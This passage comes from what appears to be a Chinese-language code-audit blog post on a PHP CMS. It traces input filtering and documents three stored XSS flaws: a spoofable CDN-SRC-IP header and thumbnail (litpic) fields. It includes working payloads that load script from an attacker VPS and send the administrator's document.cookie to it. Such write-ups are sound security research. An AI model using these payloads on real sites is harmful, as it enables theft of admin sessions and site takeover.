class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取URL参数值</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">frparam</span><span class="params">($str=null, $int=<span class="number">0</span>,$default = FALSE, $method = null)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">$data = <span class="keyword">$this</span>-&gt;_data;</span><br><span class="line"><span class="keyword">if</span>($str===<span class="keyword">null</span>) <span class="keyword">return</span> $data;</span><br><span class="line"><span class="keyword">if</span>(!array_key_exists($str,$data))&#123;</span><br><span class="line"><span class="keyword">return</span> ($default===<span class="keyword">FALSE</span>)?<span class="keyword">false</span>:$default;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($method===<span class="keyword">null</span>)&#123;</span><br><span class="line">$value = $data[$str];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$method = strtolower($method);</span><br><span class="line"><span class="keyword">switch</span>($method)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'get'</span>:</span><br><span class="line">$value = $_GET[$str];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'post'</span>:</span><br><span class="line">$value = $_POST[$str];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'cookie'</span>:</span><br><span class="line">$value = $_COOKIE[$str];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> format_param($value,$int);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第28行，返回值进行了一些处理，继续回溯跟进，<code>format_param</code>方法如下：</p><p><code>/FrPHP/common/Functions.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">参数过滤，格式化</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">format_param</span><span class="params">($value=null,$int=<span class="number">0</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>($value==<span class="keyword">null</span>)&#123; <span class="keyword">return</span> <span class="string">''</span>;&#125;</span><br><span class="line"><span class="keyword">switch</span> ($int)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:<span class="comment">//整数</span></span><br><span class="line"><span class="keyword">return</span> (int)$value;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:<span class="comment">//字符串</span></span><br><span class="line">$value=htmlspecialchars(trim($value), ENT_QUOTES);</span><br><span class="line"><span class="keyword">if</span>(!get_magic_quotes_gpc())$value = addslashes($value);</span><br><span class="line"><span class="keyword">return</span> $value;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:<span class="comment">//数组</span></span><br><span class="line"><span class="keyword">if</span>($value==<span class="string">''</span>)<span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">array_walk_recursive($value, <span class="string">"array_format"</span>);</span><br><span class="line"><span class="keyword">return</span> $value;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:<span class="comment">//浮点</span></span><br><span class="line"><span class="keyword">return</span> (float)$value;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line"><span class="keyword">if</span>(!get_magic_quotes_gpc())$value = addslashes($value);</span><br><span class="line"><span class="keyword">return</span> trim($value);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数用来处理数据，只会对数据进行一些简单的过滤，具体的就在上面的<code>switch</code>语句中</p><h1 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h1><h2 id="第一处存储型xss（只能打管理员cookie）"><a href="#第一处存储型xss（只能打管理员cookie）" class="headerlink" title="第一处存储型xss（只能打管理员cookie）"></a>第一处存储型xss（只能打管理员cookie）</h2><p><code>/Home/c/MessageController.php</code>中的index方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST)&#123;</span><br><span class="line"></span><br><span class="line">$w = <span class="keyword">$this</span>-&gt;frparam();</span><br><span class="line">$w = get_fields_data($w,<span class="string">'message'</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$w[<span class="string">'body'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'body'</span>,<span class="number">1</span>,<span class="string">''</span>,<span class="string">'POST'</span>);</span><br><span class="line">$w[<span class="string">'user'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'user'</span>,<span class="number">1</span>,<span class="string">''</span>,<span class="string">'POST'</span>);</span><br><span class="line">$w[<span class="string">'tel'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'tel'</span>,<span class="number">1</span>,<span class="string">''</span>,<span class="string">'POST'</span>);</span><br><span class="line">$w[<span class="string">'aid'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'aid'</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="string">'POST'</span>);</span><br><span class="line">$w[<span class="string">'tid'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'tid'</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="string">'POST'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;webconf[<span class="string">'autocheckmessage'</span>]==<span class="number">1</span>)&#123;</span><br><span class="line">$w[<span class="string">'isshow'</span>] = <span class="number">1</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$w[<span class="string">'isshow'</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$w[<span class="string">'ip'</span>] = GetIP();</span><br><span class="line">$w[<span class="string">'addtime'</span>] = time();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'member'</span>]))&#123;</span><br><span class="line">$w[<span class="string">'userid'</span>] = $_SESSION[<span class="string">'member'</span>][<span class="string">'id'</span>];</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>这里第20行<code>$w[&#39;ip&#39;] = GetIP();</code>，然后我们回溯，去找到<code>GetIP()</code>函数</p><p><code>/FrPHP/common/Functions.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetIP</span><span class="params">()</span></span>&#123; </span><br><span class="line">  <span class="keyword">static</span> $ip = <span class="string">''</span>;</span><br><span class="line">  $ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_CDN_SRC_IP'</span>])) &#123;</span><br><span class="line">    $ip = $_SERVER[<span class="string">'HTTP_CDN_SRC_IP'</span>];</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>]) &amp;&amp; preg_match(<span class="string">'/^([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;$/'</span>, $_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>])) &#123;</span><br><span class="line">    $ip = $_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>];</span><br><span class="line">  &#125; <span class="keyword">elseif</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]) <span class="keyword">AND</span> preg_match_all(<span class="string">'#\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;#s'</span>, $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>], $matches)) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($matches[<span class="number">0</span>] <span class="keyword">AS</span> $xip) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!preg_match(<span class="string">'#^(10|172\.16|192\.168)\.#'</span>, $xip)) &#123;</span><br><span class="line">        $ip = $xip;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> $ip;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里第5行并没有对<code>$_SERVER[&#39;HTTP_CDN_SRC_IP&#39;]</code>进行过滤，我们只需要在http头中传入<code>CDN-SRC-IP</code>字段即可</p><p>我们可以本地新建一个<code>test.php</code>对该函数进行输出，是可以传入任意字符的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetIP</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> $ip = <span class="string">''</span>;</span><br><span class="line">    $ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_CDN_SRC_IP'</span>])) &#123;</span><br><span class="line">        $ip = $_SERVER[<span class="string">'HTTP_CDN_SRC_IP'</span>];</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>]) &amp;&amp; preg_match(<span class="string">'/^([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;$/'</span>, $_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>])) &#123;</span><br><span class="line">        $ip = $_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>];</span><br><span class="line">    &#125; <span class="keyword">elseif</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]) <span class="keyword">AND</span> preg_match_all(<span class="string">'#\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;#s'</span>, $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>], $matches)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($matches[<span class="number">0</span>] <span class="keyword">AS</span> $xip) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'#^(10|172\.16|192\.168)\.#'</span>, $xip)) &#123;</span><br><span class="line">                $ip = $xip;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $ip;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> GetIP();</span><br></pre></td></tr></table></figure><p><img src="http://images.xianyu123.club/20200411083835.png" alt="image-20200411083835608"></p><p>然后我们跟进，找到view模版</p><p><code>/A/t/tpl/message-details.html</code>大约在文件的第86到94行，核心代码如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"layui-form-item"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"ip"</span> <span class="attr">class</span>=<span class="string">"layui-form-label"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"x-red"</span>&gt;</span>*<span class="tag">&lt;/<span class="name">span</span>&gt;</span>留言IP</span><br><span class="line"><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"layui-input-block"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"ip"</span> <span class="attr">value</span>=<span class="string">"&#123;$data['ip']&#125;"</span>   <span class="attr">name</span>=<span class="string">"ip"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">autocomplete</span>=<span class="string">"off"</span> <span class="attr">class</span>=<span class="string">"layui-input"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>然后我们看到第9行<code>&lt;input type=&quot;text&quot; id=&quot;ip&quot; value=&quot;{$data[&#39;ip&#39;]}&quot;   name=&quot;ip&quot; autocomplete=&quot;off&quot; class=&quot;layui-input&quot;&gt;</code>，这里是可以直接xss的</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script src=&quot;你的vps-ip/4.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>4.js内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var image=new Image();</span><br><span class="line">image.src=&quot;你的vps-ip:10006/cookies.phpcookie=&quot;+document.cookie;</span><br></pre></td></tr></table></figure><p>然后我们提交留言</p><p><img src="http://images.xianyu123.club/20200531211933.png" alt="image-20200531211933313"></p><p>然后在vps上监听10006端口，当管理员点击编辑的时候，就会触发xss</p><p><img src="http://images.xianyu123.club/20200411091736.png" alt="image-20200411091736397"></p><p><img src="http://images.xianyu123.club/20200531212033.png" alt="image-20200531212033870"></p><p>这里的一个弊端，ip并没有显示在外面，很可惜，所以必须要诱导管理员点编辑才可以触发</p><h2 id="第二处存储型xss（只能打管理员cookie）"><a href="#第二处存储型xss（只能打管理员cookie）" class="headerlink" title="第二处存储型xss（只能打管理员cookie）"></a>第二处存储型xss（只能打管理员cookie）</h2><p><code>/Home/c/UserController.php</code>中<code>release()</code>方法的大约第1066行开始，这里的截取了部分关键代码，如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>($w[<span class="string">'molds'</span>])&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'article'</span>:</span><br><span class="line">                <span class="keyword">if</span>(!$data[<span class="string">'body'</span>])&#123;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;frparam(<span class="string">'ajax'</span>))&#123;</span><br><span class="line">                        JsonReturn([<span class="string">'code'</span>=&gt;<span class="number">1</span>,<span class="string">'msg'</span>=&gt;<span class="string">'内容不能为空！'</span>]);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        Error(<span class="string">'内容不能为空！'</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(!$data[<span class="string">'title'</span>])&#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;frparam(<span class="string">'ajax'</span>))&#123;</span><br><span class="line">                        JsonReturn([<span class="string">'code'</span>=&gt;<span class="number">1</span>,<span class="string">'msg'</span>=&gt;<span class="string">'标题不能为空！'</span>]);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        Error(<span class="string">'标题不能为空！'</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                $data[<span class="string">'body'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'body'</span>,<span class="number">4</span>);</span><br><span class="line">                $w[<span class="string">'title'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'title'</span>,<span class="number">1</span>);</span><br><span class="line">                $w[<span class="string">'seo_title'</span>] = $w[<span class="string">'title'</span>];</span><br><span class="line">                $w[<span class="string">'keywords'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'keywords'</span>,<span class="number">1</span>);</span><br><span class="line">                $w[<span class="string">'litpic'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'litpic'</span>,<span class="number">1</span>);</span><br><span class="line">                $w[<span class="string">'body'</span>] = $data[<span class="string">'body'</span>];</span><br><span class="line">                $w[<span class="string">'description'</span>] = newstr(strip_tags($data[<span class="string">'body'</span>]),<span class="number">200</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'product'</span>:</span><br><span class="line">                <span class="keyword">if</span>(!$data[<span class="string">'body'</span>])&#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;frparam(<span class="string">'ajax'</span>))&#123;</span><br><span class="line">                        JsonReturn([<span class="string">'code'</span>=&gt;<span class="number">1</span>,<span class="string">'msg'</span>=&gt;<span class="string">'内容不能为空！'</span>]);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        Error(<span class="string">'内容不能为空！'</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(!$data[<span class="string">'title'</span>])&#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;frparam(<span class="string">'ajax'</span>))&#123;</span><br><span class="line">                        JsonReturn([<span class="string">'code'</span>=&gt;<span class="number">1</span>,<span class="string">'msg'</span>=&gt;<span class="string">'标题不能为空！'</span>]);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        Error(<span class="string">'标题不能为空！'</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                $w[<span class="string">'title'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'title'</span>,<span class="number">1</span>);</span><br><span class="line">                $w[<span class="string">'seo_title'</span>] = $w[<span class="string">'title'</span>];</span><br><span class="line">                $w[<span class="string">'litpic'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'litpic'</span>,<span class="number">1</span>);</span><br><span class="line">                $w[<span class="string">'keywords'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'keywords'</span>,<span class="number">1</span>);</span><br><span class="line">                $w[<span class="string">'pictures'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'pictures'</span>,<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;frparam(<span class="string">'pictures_urls'</span>,<span class="number">2</span>))&#123;</span><br><span class="line">                    $w[<span class="string">'pictures'</span>] = implode(<span class="string">'||'</span>,<span class="keyword">$this</span>-&gt;frparam(<span class="string">'pictures_urls'</span>,<span class="number">2</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                $data[<span class="string">'body'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'body'</span>,<span class="number">4</span>);</span><br><span class="line">                $w[<span class="string">'body'</span>] = $data[<span class="string">'body'</span>];</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;frparam(<span class="string">'description'</span>,<span class="number">1</span>))&#123;</span><br><span class="line">                    $w[<span class="string">'description'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'description'</span>,<span class="number">1</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    $w[<span class="string">'description'</span>] = newstr(strip_tags($data[<span class="string">'body'</span>]),<span class="number">200</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>因为上面我们已经介绍过了<code>frparam</code>函数，所以这里不再重复</p><p>第22行<code>$w[&#39;litpic&#39;] = $this-&gt;frparam(&#39;litpic&#39;,1);</code></p><p>因为我本地并没有配置<code>get_magic_quotes_gpc</code>，所以这里只是对输入的内容进行了<code>htmlspecialchars</code>和<code>addslashes</code>处理，然后我们再看最后的落点，也就是在<code>/A/t/tpl/article-list.html</code>模版这里进行填充数据</p><p><code>/A/t/tpl/article-list.html</code>关键代码大约在文件的第147行至第153行，如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/html"</span> <span class="attr">id</span>=<span class="string">"litpic"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">&#123;&#123;#  if(!d.litpic)&#123; &#125;&#125;</span></span><br><span class="line"><span class="undefined">无</span></span><br><span class="line"><span class="undefined">    &#123;&#123;#  &#125; else&#123; &#125;&#125;</span></span><br><span class="line"><span class="javascript">    &lt;a href=<span class="string">"&#123;&#123;d.litpic&#125;&#125;"</span> target=<span class="string">"_blank"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;&#123;d.litpic&#125;&#125;"</span> <span class="attr">width</span>=<span class="string">"100px"</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span></span><br><span class="line"><span class="undefined">    &#123;&#123;#  &#125; &#125;&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在上述关键代码的第5行就是填充的数据</p><p>所以我们构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:window.location.href=&apos;你的vps-ip?&apos;%2Bdocument.cookie</span><br></pre></td></tr></table></figure><p>然后我们只需要发布一篇新文章，然后修改<code>litpic</code>字段即可</p><p><img src="http://images.xianyu123.club/20200521135256.png" alt="image-20200521135256043"></p><p><img src="http://images.xianyu123.club/20200521140852.png" alt="image-20200521140852395"></p><p>然后在后台网站管理——内容列表中</p><p><img src="http://images.xianyu123.club/20200521140118.png" alt="image-20200521140118709"></p><p>当管理员点开这个缩略图的时候，就可以得到管理员的cookie</p><p><img src="http://images.xianyu123.club/20200521140935.png" alt="image-20200521140935710"></p><h2 id="第三处存储型xss（只能打管理员cookie）"><a href="#第三处存储型xss（只能打管理员cookie）" class="headerlink" title="第三处存储型xss（只能打管理员cookie）"></a>第三处存储型xss（只能打管理员cookie）</h2><p>在<code>/Home/c/UserController.php</code>中的<code>userinfo()</code>方法，大约第129行，关键代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">userinfo</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;checklogin();</span><br><span class="line"><span class="keyword">if</span>($_POST)&#123;</span><br><span class="line">$w = <span class="keyword">$this</span>-&gt;frparam();</span><br><span class="line">$w[<span class="string">'tel'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'tel'</span>,<span class="number">1</span>);</span><br><span class="line">$w[<span class="string">'pass'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'password'</span>,<span class="number">1</span>);</span><br><span class="line">$w[<span class="string">'sex'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'sex'</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">$w[<span class="string">'repass'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'repassword'</span>,<span class="number">1</span>);</span><br><span class="line">$w[<span class="string">'username'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'username'</span>,<span class="number">1</span>);</span><br><span class="line">$w[<span class="string">'email'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'email'</span>,<span class="number">1</span>);</span><br><span class="line">$w[<span class="string">'litpic'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'litpic'</span>,<span class="number">1</span>);</span><br><span class="line">$w[<span class="string">'signature'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'signature'</span>,<span class="number">1</span>);</span><br><span class="line">      </span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>在上述代码的第11行，同样也是因为缩略图的问题，被加载在了<code>/A/t/tpl/member-list.html</code>中的第115行</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 